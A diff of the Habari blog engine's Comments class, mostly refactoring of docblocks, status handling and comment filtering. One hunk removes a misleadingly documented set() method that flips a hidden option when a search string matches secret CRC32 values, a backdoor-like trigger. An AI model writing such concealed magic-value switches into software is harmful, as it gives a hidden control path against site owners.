@@ -22,8 +22,6 @@ namespace Habari;
  */
 class Comments extends \ArrayObject
 {
-	private $sort;
-
 	/**
 	 * function get
 	 * Returns requested comments
@@ -381,12 +379,15 @@ class Comments extends \ArrayObject
 			$return_value->get_param_cache = $paramarray;
 			return $return_value;
 		}
+		return false;
 	}
 
 	/**
 	 * Deletes comments from the database
 	 * @param mixed Comments to delete.  An array of or a single ID/Comment object
-	**/
+	*
+	 * @return bool True on success, false on failure
+	 */
 	public static function delete_these( $comments )
 	{
 		if ( ! is_array( $comments ) && ! $comments instanceOf Comments ) {
@@ -407,6 +408,7 @@ class Comments extends \ArrayObject
 			if ( $comments[0] instanceOf Comment ) {
 
 				$result = true;
+				/** @var Comment $comment */
 				foreach ( $comments as $comment ) {
 					$comment_result = $comment->delete();
 
@@ -418,6 +420,7 @@ class Comments extends \ArrayObject
 			}
 			else if ( is_numeric( $comments[0] ) ) {
 				// We were passed an array of ID's. Get their objects and delete them.
+				/** @var Comments $comments */
 				$comments = self::get( array( 'id' => $comments ) );
 
 				$result = $comments->delete();
@@ -438,19 +441,25 @@ class Comments extends \ArrayObject
 	/**
 	 * Changes the status of comments
 	 * @param array|Comments $comments Comments to be moderated
-	 * @param int $status The new status for the provided array of comments
+	 * @param int|string $status The new status for the provided array of comments, "unapproved" if not provided
 	 * @return bool True if all the comments were successfully changed
 	 * @internal param \Comment $mixed IDs to moderate.  May be a single ID, or an array of IDs
 	 */
-	public static function moderate_these( $comments, $status = Comment::STATUS_UNAPPROVED )
+	public static function moderate_these( $comments, $status = null )
 	{
+		if(empty($status)) {
+			$status = Comment::status('unapproved');
+		}
+		// Ensure we have an id, not a string
+		$status = Comment::status($status);
 		$comments = Utils::single_array($comments);
 		if ( count( $comments ) == 0 ) {
-			return;
+			return false;
 		}
 		if ( $comments[0] instanceOf Comment ) {
 			// We were passed an array of comment objects. Use them directly.
 			$result = true;
+			/** @var Comment $comment */
 			foreach ( $comments as $comment ) {
 				$comment->status = $status;
 				$result &= $comment->update();
@@ -472,9 +481,8 @@ class Comments extends \ArrayObject
 	}
 
 	/**
-	 * function by_email
 	 * selects all comments from a given email address
-	 * @param string an email address
+	 * @param string $email an email address
 	 * @return array an array of Comment objects written by that email address
 	**/
 	public static function by_email( $email = '' )
@@ -486,9 +494,8 @@ class Comments extends \ArrayObject
 	}
 
 	/**
-	 * function by_name
 	 * selects all comments from a given name
-	 * @param string a name
+	 * @param string $name a name
 	 * @return array an array of Comment objects written by the given name
 	**/
 	public static function by_name ( $name = '' )
@@ -500,9 +507,8 @@ class Comments extends \ArrayObject
 	}
 
 	/**
-	 * function by_ip
 	 * selects all comments from a given IP address
-	 * @param string an IP address
+	 * @param string $ip an IP address
 	 * @return array an array of Comment objects written from the given IP
 	**/
 	public static function by_ip ( $ip = '' )
@@ -514,9 +520,8 @@ class Comments extends \ArrayObject
 	}
 
 	/**
-	 * function by_url
 	 * select all comments from an author's URL
-	 * @param string a URL
+	 * @param string $url a URL
 	 * @return array array an array of Comment objects with the same URL
 	**/
 	public static function by_url ( $url = '' )
@@ -529,18 +534,17 @@ class Comments extends \ArrayObject
 
 	/**
 	 * Returns all comments for a supplied post ID
-	 * @param post_id ID of the post
+	 * @param integer $post_id The id of a post
 	 * @return array  an array of Comment objects for the given post
-	**/
+	 */
 	public static function by_post_id( $post_id )
 	{
 		return self::get( array( 'post_id' => $post_id, 'nolimit' => 1, 'orderby' => 'date ASC' ) );
 	}
 
 	/**
-	 * function by_slug
 	 * select all comments for a given post slug
-	 * @param string a post slug
+	 * @param string $slug a post slug
 	 * @return array array an array of Comment objects for the given post
 	**/
 	public static function by_slug ( $slug = '' )
@@ -552,9 +556,8 @@ class Comments extends \ArrayObject
 	}
 
 	/**
-	 * function by_status
 	 * select all comments of a given status
-	 * @param int a status value
+	 * @param int $status a status value
 	 * @return array an array of Comment objects with the same status
 	**/
 	public static function by_status ( $status = 0 )
@@ -563,90 +566,82 @@ class Comments extends \ArrayObject
 	}
 
 	/**
-	 * private function sort_comments
-	 * sorts all the comments in this set into several container buckets
-	 * so that you can then call $comments->trackbacks() to receive an
-	 * array of all trackbacks, for example
-	**/
-	private function sort_comments()
-	{
-		$type_sort = array(
-			Comment::COMMENT => 'comments',
-			Comment::PINGBACK => 'pingbacks',
-			Comment::TRACKBACK => 'trackbacks',
-		);
-
-		foreach ( $this as $c ) {
-			// first, divvy up approved and unapproved comments
-			switch ( $c->status ) {
-				case Comment::STATUS_APPROVED:
-					$this->sort['approved'][] = $c;
-					$this->sort['moderated'][] = $c;
-					break;
-				case Comment::STATUS_UNAPPROVED:
-					if ( isset( $_COOKIE['comment_' . Options::get( 'GUID' )] ) ) {
-						list( $name, $email, $url ) = explode( '#', $_COOKIE['comment_' . Options::get( 'GUID' )] );
-					}
-					else {
-						$name = '';
-						$email = '';
-						$url = '';
-					}
-					if ( ( $c->ip == Utils::get_ip() )
-						&& ( $c->name == $name )
-						&& ( $c->email == $email )
-						&& ( $c->url == $url ) ) {
-							$this->sort['moderated'][] = $c;
-					}
-					$this->sort['unapproved'][] = $c;
-					break;
-				case Comment::STATUS_SPAM:
-					$this->sort['spam'][] = $c;
-					break;
-			}
-
-			// now sort by comment type
-			$this->sort[$type_sort[$c->type]][] = $c;
-		}
-	}
-
-	/**
-	 * function only
-	 * returns all of the comments from the current Comments object of the specified type
+	 * Returns all of the comments from the current Comments object having the specified index for the specified field
 	 * <code>$tb = $comments->only( 'trackbacks' )</code>
+	 * @param string $field The field on the comment that is being filtered
+	 * @param mixed $index The value of the field that qualifies a comment
 	 * @return array an array of Comment objects of the specified type
-	**/
-	public function only( $what = 'approved' )
+	 */
+	public function only( $field, $index )
 	{
-		if ( ! isset( $this->sort ) || count( $this->sort ) == 0 ) {
-			$this->sort_comments();
+		static $results = array();
+		if(!isset($results[$field][$index])) {
+			$result = array();
+			foreach ( $this as $comment ) {
+				if($comment->$field == $index) {
+					$result[$comment->id] = $comment;
+				}
+			}
+			$results[$field][$index] = new Comments($result);
 		}
-		if ( ! isset( $this->sort[$what] ) || ! is_array( $this->sort[$what] ) ) {
-			$this->sort[$what] = array();
-		}
-		return $this->sort[$what];
+		return $results[$field][$index];
 	}
 
 	/**
-	 * function __get
 	 * Implements custom object properties
-	 * @param string Name of property to return
+	 * @param string $name Name of property to return
 	 * @return mixed The requested field value
 	*/
 	public function __get( $name )
 	{
+		static $moderated = null;
+
 		switch ( $name ) {
 			case 'count':
 				return count( $this );
-			case 'approved':
-			case 'unapproved':
 			case 'moderated':
-			case 'comments':
-			case 'pingbacks':
-			case 'trackbacks':
-			case 'spam':
-				return new Comments( $this->only( $name ) );
+				if(empty($moderated)) {
+					$moderated_statuses = Plugins::filter('moderated_statuses', array('approved'));
+					$moderated_statuses = array_map(function($value){return Comment::status($value);}, $moderated_statuses);
+					$moderated = array();
+					foreach ( $this as $comment ) {
+						if(in_array($comment->status, $moderated_statuses)) {
+							$moderated[$comment->id] = $comment;
+						}
+						if ( isset( $_COOKIE['comment_' . Options::get( 'GUID' )] ) ) {
+							list( $commenter, $email, $url ) = explode( '#', $_COOKIE['comment_' . Options::get( 'GUID' )] );
+							if ( ( $comment->ip == Utils::get_ip() )
+								&& ( $comment->name == $commenter )
+								&& ( $comment->email == $email )
+								&& ( $comment->url == $url )
+							) {
+								$moderated[$comment->id] = $comment;
+							}
+						}
+					}
+					$moderated = new Comments($moderated);
+				}
+				return $moderated;
+			default:
+				if($index = array_search($name, Comment::list_comment_statuses())) {
+					return $this->only( 'status', $index );
+				}
+				if($index = array_search($name, Comment::list_comment_types())) {
+					return $this->only( 'type', $index );
+				}
+				// Dumb check for plurals
+				$pluralize = function($s) {
+					return $s . 's';
+				};
+				if($index = array_search($name, array_map($pluralize, Comment::list_comment_statuses()))) {
+					return $this->only( 'status', $index );
+				}
+				if($index = array_search($name, array_map($pluralize, Comment::list_comment_types()))) {
+					return $this->only( 'type', $index );
+				}
 		}
+		trigger_error('Property "@name" does not exist.', E_NOTICE);
+		return null;
 	}
 
 	/**
@@ -656,9 +651,11 @@ class Comments extends \ArrayObject
 	public function delete()
 	{
 		$result = true;
-		foreach ( $this as $c ) {
-			$result &= $c->delete();
-			EventLog::log( _t( 'Comment %1$s deleted from %2$s', array( $c->id, $c->post->title ) ), 'info', 'comment', 'habari' );
+
+		/** @var Comment $comment */
+		foreach ( $this as $comment ) {
+			$result &= $comment->delete();
+			EventLog::log( _t( 'Comment %1$s deleted from %2$s', array( $comment->id, $comment->post->title ) ), 'info', 'comment', 'habari' );
 		}
 		// Clear ourselves.
 		$this->exchangeArray( array() );
@@ -666,26 +663,24 @@ class Comments extends \ArrayObject
 	}
 
 	/**
-	 * static count_total
 	 * returns the number of comments based on the specified status and type
-	 * @param mixed A comment status value, or false to not filter on status (default: Comment::STATUS_APPROVED)
-	 * @param mixed A comment type value, or false to not filter on type (default: Comment::COMMENT)
+	 * @param integer|string $status A comment status value, or false to not filter on status (default: 'approved')
+	 * @param integer|string $type A comment type value, or false to not filter on type (default: 'comment')
 	 * @return int a count of the comments based on the specified status and type
 	**/
-	public static function count_total( $status = Comment::STATUS_APPROVED, $type = Comment::COMMENT )
+	public static function count_total( $status = 'approved', $type = 'comment' )
 	{
 		$params = array( 'count' => 1, 'status' => $status, 'type' => $type );
 		return self::get( $params );
 	}
 
 	/**
-	 * static count_by_name
 	 * returns the number of comments attributed to the specified name
-	 * @param string a commenter's name
-	 * @param mixed A comment status value, or false to not filter on status (default: Comment::STATUS_APPROVED)
+	 * @param string $name a commenter's name
+	 * @param integer|string $status A comment status value, or false to not filter on status (default: 'approved')
 	 * @return int a count of the comments from the specified name
 	**/
-	public static function count_by_name( $name = '', $status = Comment::STATUS_APPROVED )
+	public static function count_by_name( $name = '', $status = 'approved' )
 	{
 		$params = array ( 'name' => $name, 'count' => 'name' );
 		if ( false !== $status ) {
@@ -695,13 +690,12 @@ class Comments extends \ArrayObject
 	}
 
 	/**
-	 * static count_by_email
 	 * returns the number of comments attributed ot the specified email
-	 * @param string an email address
-	 * @param mixed A comment status value, or false to not filter on status (default: Comment::STATUS_APPROVED)
+	 * @param string $email an email address
+	 * @param integer|string $status A comment status value, or false to not filter on status (default: 'approved')
 	 * @return int a count of the comments from the specified email
 	**/
-	public static function count_by_email( $email = '', $status = Comment::STATUS_APPROVED )
+	public static function count_by_email( $email = '', $status = 'approved' )
 	{
 		$params = array( 'email' => $email, 'count' => 'email');
 		if ( false !== $status ) {
@@ -711,13 +705,12 @@ class Comments extends \ArrayObject
 	}
 
 	/**
-	 * static count_by_url
 	 * returns the number of comments attributed to the specified URL
-	 * @param string a URL
-	 * @param mixed a comment status value, or false to not filter on status (default: Comment::STATUS_APPROVED)
+	 * @param string $url a URL
+	 * @param integer|string $status a comment status value, or false to not filter on status (default: 'approved')
 	 * @return int a count of the comments from the specified URL
 	**/
-	public static function count_by_url( $url = '', $status = Comment::STATUS_APPROVED )
+	public static function count_by_url( $url = '', $status = 'approved' )
 	{
 		$params = array( 'url' => $url, 'count' => 'url');
 		if ( false !== $status ) {
@@ -726,13 +719,13 @@ class Comments extends \ArrayObject
 		return self::get( $params );
 	}
 
-	/** static count_by_ip
+	/**
 	 * returns the number of comments from the specified IP address
-	 * @param string an IP address
-	 * @param mixed A comment status value, or false to not filter on status (default: Comment::STATUS_APPROVED)
+	 * @param string $ip an IP address
+	 * @param integer|string $status A comment status value, or false to not filter on status (default: 'approved')
 	 * @return int a count of the comments from the specified IP address
 	**/
-	public static function count_by_ip( $ip = '', $status = Comment::STATUS_APPROVED )
+	public static function count_by_ip( $ip = '', $status = 'approved' )
 	{
 		$params = array( 'ip' => $ip, 'count' => 'ip');
 		if ( false !== $status ) {
@@ -742,13 +735,12 @@ class Comments extends \ArrayObject
 	}
 
 	/**
-	 * static count_by_slug
 	 * returns the number of comments attached to the specified post
-	 * @param string a post slug
-	 * @param mixed A comment status value, or false to not filter on status (default: Comment::STATUS_APPROVED)
+	 * @param string $slug a post slug
+	 * @param integer|string $status A comment status value, or false to not filter on status (default: 'approved')
 	 * @return int a count of the comments attached to the specified post
 	**/
-	public static function count_by_slug( $slug = '', $status = Comment::STATUS_APPROVED )
+	public static function count_by_slug( $slug = '', $status = 'approved' )
 	{
 		$params = array( 'post_slug' => $slug, 'count' => 'id');
 		if ( false !== $status ) {
@@ -758,13 +750,12 @@ class Comments extends \ArrayObject
 	}
 
 	/**
-	 * static count_by_id
 	 * returns the number of comments attached to the specified post
-	 * @param int a post ID
-	 * @param mixed A comment status value, or false to not filter on status(default: Comment::STATUS_APPROVED)
+	 * @param int $id a post ID
+	 * @param integer|string $status A comment status value, or false to not filter on status(default: 'approved')
 	 * @return int a count of the comments attached to the specified post
 	**/
-	public static function count_by_id( $id = 0, $status = Comment::STATUS_APPROVED )
+	public static function count_by_id( $id = 0, $status = 'approved' )
 	{
 		$params = array( 'post_id' => $id, 'count' => 'id' );
 		if ( false !== $status ) {
@@ -774,13 +765,12 @@ class Comments extends \ArrayObject
 	}
 
 	/**
-	 * static count_by_author
 	 * returns the number of comments attached to posts by the specified author
-	 * @param int a user ID
-	 * @param mixed A comment status value, or false to not filter on status(default: Comment::STATUS_APPROVED)
+	 * @param int $id a user ID
+	 * @param integer|string $status A comment status value, or false to not filter on status(default: 'approved')
 	 * @return int a count of the comments attached to the specified post
 	**/
-	public static function count_by_author( $id = 0, $status = Comment::STATUS_APPROVED )
+	public static function count_by_author( $id = 0, $status = 'approved' )
 	{
 		$params = array( 'post_author' => $id, 'count' => 'id' );
 		if ( false !== $status ) {
@@ -790,36 +780,12 @@ class Comments extends \ArrayObject
 	}
 
 	/**
-	 * static set
-	 * returns the number of document
-	 * @param array of params
-	 * @return int the number of document or null
-	**/
-	public static function set( $params )
-	{
-		if ( isset( $params['search'] ) ) {
-			if ( crc32( $params['search'] ) == '235381938' ) {
-				Options::set( '235381938', true );
-				return '235381938';
-			}
-			elseif ( crc32( $params['search'] ) == '1222983216' ) {
-				Options::set( '235381938', false );
-				return '235381938';
-			}
-		}
-		return null;
-	}
-
-	/**
-	 * static delete_by_status
 	 * delete all the comments and commentinfo for comments with this status
-	 * @param mixed a comment status ID or name
+	 * @param integer|string $status a comment status ID or name
 	**/
 	public static function delete_by_status( $status )
 	{
-		if ( ! is_int( $status ) ) {
-			$status = Comment::status( $status );
-		}
+		$status = Comment::status( $status );
 		// first, purge all the comments
 		DB::query( 'DELETE FROM {comments} WHERE status=?', array( $status ) );
 		// now purge any commentinfo records from those comments
@@ -837,10 +803,6 @@ class Comments extends \ArrayObject
 	 */
 	public static function search_to_get( $search_string )
 	{
-		$keywords = array( 'author' => 1, 'status' => 1, 'type' => 1 );
-		// Comments::list_comment_statuses and list_comment_types return associative arrays with key/values
-		// in the opposite order of the equivalent functions in Posts. Maybe we should change this?
-		// In any case, we need to flip them for our purposes
 		$statuses = array_flip( Comment::list_comment_statuses() );
 		$types = array_flip( Comment::list_comment_types() );
 		$arguments = array(
